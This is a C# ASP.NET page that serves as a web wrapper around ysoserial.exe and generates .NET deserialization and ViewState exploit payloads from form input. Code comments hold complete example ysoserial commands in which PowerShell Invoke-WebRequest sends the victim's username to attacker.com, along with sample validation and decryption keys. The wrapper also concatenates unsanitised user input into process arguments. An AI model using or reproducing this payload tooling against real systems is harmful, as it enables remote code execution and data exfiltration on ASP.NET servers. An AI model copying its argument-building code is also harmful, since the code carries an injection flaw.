using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace WebWrapper
{
    public partial class YSoSerial : System.Web.UI.Page
    {
        private static string strYSoSerialExePath = String.Format(@"{0}\ysoserial\ysoserial.exe", Path.Combine(HttpRuntime.AppDomainAppPath, "App_Data"));

        protected void Page_Load(object sender, EventArgs e)
        {
            if (dropDownPlugins.SelectedIndex == 0)
            {
                GenericPlugin();
            }
            else
            {
                ViewStatePlugin();
            }
        }

        protected void btnSubmit_Click(object sender, EventArgs e)
        {
            string argument = string.Empty;
            //string plugin = dropDownPlugins.Text;
            string gadget = Regex.Replace(dropdownGadget.Text, "[^A-Za-z]", "");
            if (dropDownPlugins.SelectedIndex == 0)
            {
                string formatter = Regex.Replace(dropDownFormatter.Text, "[^A-Za-z]", "");
                //string output = Regex.Replace(dropdownOutput.Text, "[^A-Za-z0-9]", "");

                //strCommandParameters are parameters to pass to program
                //argument = "-g " + gadget + " -f " + formatter + " -o " + output + " -c \"" + txtCommand.Text + "\"";
                argument = "-g " + gadget + " -f " + formatter + " -o base64" + " -c \"" + txtCommand.Text + "\"";

            }
            else
            {
                if(dropdownAspNetVersion.SelectedIndex == 0)
                {
                    /*ysoserial.exe - p ViewState - g TextFormattingRunProperties - c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName"--generator = CA0B0334--validationalg = "SHA1"--validationkey = "C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"*/
                    string generator = Regex.Replace(txtGenerator.Text, "[^A-Za-z0-9]", "");
                    string validationAlgo = Regex.Replace(dropdownValdiationAlgo.Text, "[^A-Za-z0-9]", "");
                    string validationKey = Regex.Replace(txtValidationKey.Text, "[^A-Za-z0-9]", "");
                    argument = " -p ViewState" + " -g " + gadget + " --generator " + generator + " --validationalg " + validationAlgo +
                        " --validationkey "+ validationKey + " -c \"" + txtCommand.Text + "\"";
                }
                else
                {
                    /*ysoserial.exe -p ViewState  -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/$env:UserName" --path="/content/default.aspx" --apppath="/" --decryptionalg="AES" --decryptionkey="F6722806843145965513817CEBDECBB1F94808E4A6C0B2F2"  --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"*/
                    string validationAlgo = Regex.Replace(dropdownValdiationAlgo.Text, "[^A-Za-z0-9]", "");
                    string validationKey = Regex.Replace(txtValidationKey.Text, "[^A-Za-z0-9]", "");
                    string decryptionAlgo = Regex.Replace(dropdownDecryptionAlgo.Text, "[^A-Za-z0-9]", "");
                    string decryptionKey = Regex.Replace(txtDecryptionKey.Text, "[^A-Za-z0-9]", "");
                    string targetPagePath = txtTargetPagePath.Text;
                    string appPathInIIS = txtAppPathInIIS.Text;
                    argument = " -p ViewState" + " -g " + gadget + " --validationalg " + validationAlgo +
                        " --validationkey " + validationKey + " --decryptionalg " + decryptionAlgo +
                        " --decryptionkey " + decryptionKey + " --path " + targetPagePath + " --apppath " + appPathInIIS + " -c \"" + txtCommand.Text + "\"";
                }
            }
            System.Diagnostics.Process pProcess = new System.Diagnostics.Process();
            pProcess.StartInfo.FileName = strYSoSerialExePath;//strCommand is path and file name of command to run
            pProcess.StartInfo.Arguments = argument;
            pProcess.StartInfo.UseShellExecute = false;
            pProcess.StartInfo.RedirectStandardOutput = true; //Set output of program to be written to process output stream
            pProcess.Start();//Start the process
            string strOutput = pProcess.StandardOutput.ReadToEnd(); //Get program output
            pProcess.WaitForExit();//Wait for process to finish

            lblYSoSerialCommand.Text = "ysoserial.exe " + argument;
            txtOutput.Text = strOutput;
        }

        void GenericPlugin()
        {
            labelAspNetVersion.Visible = false;
            dropdownAspNetVersion.Visible = false;

            labelValdiationAlgo.Visible = false;
            dropdownValdiationAlgo.Visible = false;
            labelValidationKey.Visible = false;
            txtValidationKey.Visible = false;

            labelDecryptionAlgo.Visible = false;
            dropdownDecryptionAlgo.Visible = false;
            labelDecryptionKey.Visible = false;
            txtDecryptionKey.Visible = false;

            lableTaragetPagePath.Visible = false;
            txtTargetPagePath.Visible = false;
            labelIISPath.Visible = false;
            txtAppPathInIIS.Visible = false;

            labelGenerator.Visible = false;
            txtGenerator.Visible = false;

            labelDownFormatter.Visible = true;
            dropDownFormatter.Visible = true;
        }

        void ViewStatePlugin()
        {
            labelDownFormatter.Visible = false;
            dropDownFormatter.Visible = false;

            labelAspNetVersion.Visible = true;
            dropdownAspNetVersion.Visible = true;

            labelValdiationAlgo.Visible = true;
            dropdownValdiationAlgo.Visible = true;
            labelValidationKey.Visible = true;
            txtValidationKey.Visible = true;

            if (dropdownAspNetVersion.SelectedIndex == 0)
            {
                labelGenerator.Visible = true;
                txtGenerator.Visible = true;

                labelDecryptionAlgo.Visible = false;
                dropdownDecryptionAlgo.Visible = false;
                labelDecryptionKey.Visible = false;
                txtDecryptionKey.Visible = false;

                lableTaragetPagePath.Visible = false;
                txtTargetPagePath.Visible = false;
                labelIISPath.Visible = false;
                txtAppPathInIIS.Visible = false;
            }
            else
            {
                labelDecryptionAlgo.Visible = true;
                dropdownDecryptionAlgo.Visible = true;
                labelDecryptionKey.Visible = true;
                txtDecryptionKey.Visible = true;

                lableTaragetPagePath.Visible = true;
                txtTargetPagePath.Visible = true;
                labelIISPath.Visible = true;
                txtAppPathInIIS.Visible = true;

                labelGenerator.Visible = false;
                txtGenerator.Visible = false;
            }
        }

        protected void dropDownPlugins_SelectedIndexChanged(object sender, EventArgs e)
        {
            if(dropDownPlugins.SelectedIndex == 0)
            {
                GenericPlugin();
            }
            else
            {
                ViewStatePlugin();
            }
        }

        protected void dropdownAspNetVersion_SelectedIndexChanged(object sender, EventArgs e)
        {
            ViewStatePlugin();
        }
    }
}